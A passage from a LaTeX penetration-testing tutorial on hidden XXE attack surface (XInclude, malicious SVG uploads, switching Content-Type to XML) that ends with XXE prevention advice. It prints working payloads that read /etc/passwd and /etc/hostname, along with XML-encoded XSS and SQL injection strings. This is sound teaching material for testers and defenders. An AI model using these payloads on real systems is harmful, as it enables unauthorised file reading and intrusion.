+In many cases, XXE attack surface is obvious because the application's normal HTTP traffic includes requests containing XML data. However, the attack surface is less visible in other cases. If you look in the right places, you will find XXE attack surface even in requests that do not contain any XML.
+
+\begin{infobox}[Key Insight]
+XXE vulnerabilities can exist in unexpected places. Don't limit your testing to requests that explicitly contain XML format.
+\end{infobox}
+
+\subsection{XInclude Attacks}
+
+\subsubsection{The Scenario}
+Some applications receive client-submitted data, embed it server-side into an XML document, and then parse the document. For example, client data might be placed into a back-end SOAP request, which is then processed by a SOAP service.
+
+\subsubsection{The Challenge}
+In this situation, you cannot carry out a classic XXE attack because:
+\begin{itemize}
+    \item You don't control the entire XML document
+    \item You cannot define or modify a DOCTYPE element
+\end{itemize}
+
+\subsubsection{The Solution: XInclude}
+XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
+
+\begin{warningbox}[Why XInclude Works]
+You can place an XInclude attack within \textbf{any data value} in an XML document. This means the attack can be performed when you only control a single item of data embedded into a server-side XML document.
+\end{warningbox}
+
+\subsubsection{XInclude Attack Payload}
+To perform an XInclude attack, reference the XInclude namespace and provide the path to the file you wish to include: eg. Set the value of the productId parameter to: 
+
+\begin{lstlisting}[language=XML]
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+\end{lstlisting}
+
+\begin{codebox}[How It Works]
+\begin{itemize}
+    \item \texttt{xmlns:xi="http://www.w3.org/2001/XInclude"} - Declares the XInclude namespace
+    \item \texttt{parse="text"} - Tells the parser to include the file as raw text
+    \item \texttt{href="file:///etc/passwd"} - Specifies the local file to read
+\end{itemize}
+\end{codebox}
+
+\subsection{XXE Attacks via File Upload}
+
+\subsubsection{The Vector}
+Some applications allow users to upload files which are then processed server-side. Many common file formats use XML or contain XML subcomponents.
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Format} & \textbf{XML-Based?} \\
+\hline
+SVG (Images) & Yes - Pure XML \\
+\hline
+DOCX (Word) & Yes - ZIP containing XML files \\
+\hline
+XLSX (Excel) & Yes - ZIP containing XML files \\
+\hline
+PPTX (PowerPoint) & Yes - ZIP containing XML files \\
+\hline
+PNG/JPEG & No - But libraries may support SVG \\
+\hline
+\end{tabular}
+\end{table}
+
+\subsubsection{The Attack Scenario}
+An application might allow users to upload images and process them server-side. Even if the application expects PNG or JPEG format, the image processing library might also support SVG images. Since SVG uses XML, an attacker can submit a malicious SVG image to reach hidden XXE attack surface.
+
+\subsubsection{SVG XXE Payload Example}
+\begin{lstlisting}[language=XML, caption=Malicious SVG File for XXE]
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ 
+    <!ENTITY xxe SYSTEM "file:///etc/hostname" > 
+]>
+<svg width="128px" height="128px" 
+     xmlns="http://www.w3.org/2000/svg" 
+     xmlns:xlink="http://www.w3.org/1999/xlink" 
+     version="1.1">
+    <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+\end{lstlisting}
+
+\begin{infobox}[How the SVG Attack Works]
+\begin{enumerate}
+    \item Attacker uploads malicious SVG file
+    \item Server processes the image using an XML-capable library
+    \item The XXE payload executes when the SVG is parsed
+    \item File contents are displayed within the SVG text element or exfiltrated
+\end{enumerate}
+\end{infobox}
+
+\subsection{XXE Attacks via Modified Content Type}
+
+\subsubsection{The Observation}
+Most POST requests use default content types from HTML forms, such as \texttt{application/x-www-form-urlencoded}. However, some web sites that expect this format will \textbf{tolerate other content types}, including XML.
+
+\subsubsection{Normal Request Example}
+\begin{lstlisting}[caption=Standard Form Submission]
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+\end{lstlisting}
+
+\subsubsection{Modified Request with XML}
+You might be able to submit the following request with the same result:
+
+\begin{lstlisting}[caption=Same Request in XML Format]
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?>
+<foo>bar</foo>
+\end{lstlisting}
+
+\subsubsection{Why This Works}
+\begin{codebox}[The Content Type Tolerance]
+If the application:
+\begin{enumerate}
+    \item Expects \texttt{application/x-www-form-urlencoded} but...
+    \item Tolerates receiving \texttt{text/xml} instead, and...
+    \item Parses the body content as XML...
+    
+Then you can reach hidden XXE attack surface simply by reformatting requests to use XML format!
+\end{enumerate}
+\end{codebox}
+
+\subsubsection{Testing Methodology}
+To discover this hidden attack surface:
+
+\begin{enumerate}
+    \item Identify a normal POST request (login, search, form submission)
+    \item Change the \texttt{Content-Type} header to \texttt{text/xml} or \texttt{application/xml}
+    \item Convert the body parameters into XML format
+    \item Add an XXE payload to test for vulnerability
+\end{enumerate}
+
+\begin{lstlisting}[caption=Complete XXE Test via Content Type Modification]
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 200
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+\end{lstlisting}
+
+\subsection{Important Note: Beyond XXE}
+
+\begin{dangerbox}[Critical Reminder]
+Keep in mind that \textbf{XML is just a data transfer format}. When testing any XML-based functionality, don't limit yourself to XXE attacks. You should also test for other common vulnerabilities.
+\end{dangerbox}
+
+\subsubsection{Other Vulnerabilities to Test}
+
+When you find an endpoint that accepts XML input, always test for:
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Vulnerability} & \textbf{Description} \\
+\hline
+XSS (Cross-Site Scripting) & Can you inject JavaScript that executes when XML is rendered? \\
+\hline
+SQL Injection & Does the XML data get used in database queries? \\
+\hline
+Command Injection & Are XML values passed to system commands? \\
+\hline
+Path Traversal & Can you use \texttt{../} sequences in XML values? \\
+\hline
+SSRF & Can you make the server request internal resources? \\
+\hline
+\end{tabular}
+\end{table}
+
+\subsubsection{Encoding Your Payloads}
+
+\begin{warningbox}[XML Encoding Required]
+You may need to encode your payload using \textbf{XML escape sequences} to avoid breaking the XML syntax.
+\end{warningbox}
+
+\paragraph{Common XML Escape Sequences}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Character} & \textbf{Escape Sequence} & \textbf{Why Needed} \\
+\hline
+< & \&lt; & Opens an XML tag \\
+\hline
+> & \&gt; & Closes an XML tag \\
+\hline
+\& & \&amp; & Starts an entity reference \\
+\hline
+" & \&quot; & Opens/closes attributes \\
+\hline
+' & \&apos; & Opens/closes attributes \\
+\hline
+\end{tabular}
+\end{table}
+
+\subsubsection{Example: Encoding an XSS Payload for XML}
+
+\paragraph{Unencoded Payload (Will Break XML):}
+\begin{lstlisting}[language=XML]
+<userInput><script>alert(1)</script></userInput>
+\end{lstlisting}
+This fails because the \texttt{<} and \texttt{>} characters interfere with XML tags.
+
+\paragraph{Properly Encoded Payload:}
+\begin{lstlisting}[language=XML]
+<userInput>&lt;script&gt;alert(1)&lt;/script&gt;</userInput>
+\end{lstlisting}
+
+\subsubsection{Example: Encoding SQL Injection for XML}
+
+\paragraph{Unencoded Payload:}
+\begin{lstlisting}[language=XML]
+<search>' OR '1'='1</search>
+\end{lstlisting}
+
+\paragraph{Encoded Payload:}
+\begin{lstlisting}[language=XML]
+<search>&apos; OR &apos;1&apos;=&apos;1</search>
+\end{lstlisting}
+
+\subsubsection{Practical Testing Tips}
+
+\begin{infobox}[Testing Checklist]
+When testing XML endpoints:
+\begin{enumerate}
+    \item First, ensure your payload is \textbf{XML-valid} using escape sequences
+    \item Test for \textbf{XXE} using DOCTYPE declarations
+    \item Test for \textbf{XSS} by injecting encoded JavaScript
+    \item Test for \textbf{SQL injection} using encoded quotes
+    \item Test for \textbf{command injection} using encoded special characters
+    \item Test for \textbf{SSRF} using external entity references
+\end{enumerate}
+\end{infobox}
+
+\begin{codebox}[Automation Tip]
+Use Burp Suite's decoder or a custom script to automatically encode your payloads for XML. Many penetration testing tools have built-in XML encoding options.
+\end{codebox}
+
+\section{Prevention and Mitigation of XXE Vulnerabilities}
+
+Preventing XXE vulnerabilities is fundamentally about configuring your XML parser correctly. In most cases, the fixes are simple and straightforward, requiring only a few lines of configuration.
+
+\begin{infobox}[The Golden Rule]
+The most effective way to prevent XXE is to \textbf{disable DTD processing entirely} whenever possible. If DTDs are absolutely required, disable external entities, external DTDs, and parameter entities.
+\end{infobox}
+
+\subsection{General Prevention Principles}
+
+\begin{enumerate}
+    \item \textbf{Disable DTD processing} - This is the most complete solution
+    \item \textbf{Disable external entities} - If DTDs are needed, disable external references
+    \item \textbf{Disable parameter entities} - Prevent blind XXE attacks
+    \item \textbf{Disable XInclude} - Another XML feature that can be abused
+    \item \textbf{Use secure parser configurations} - Default configurations are often insecure
+    \item \textbf{Validate and sanitize XML input} - Defense in depth
+    \item \textbf{Use non-XML formats when possible} - JSON is generally safer
+\end{enumerate}
+
+
+\subsection{Defense in Depth Strategies}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|p{4cm}|p{9cm}|}
+\hline
+\textbf{Strategy} & \textbf{Implementation} \\
+\hline
+Least Privilege & Run XML parsers with minimal filesystem/network permissions \\
+\hline
+Input Size Limits & Limit XML document size and entity expansion depth \\
+\hline
+Timeouts & Set parsing timeouts to prevent billion laughs attacks \\
+\hline
+Logging & Log XML parsing errors for security monitoring \\
+\hline
+WAF Rules & Deploy rules to detect XXE payloads \\
+\hline
+Content Security & Validate Content-Type headers to prevent XML injection \\
+\hline
+\end{tabular}
+\end{table}
+
+
+\end{document}
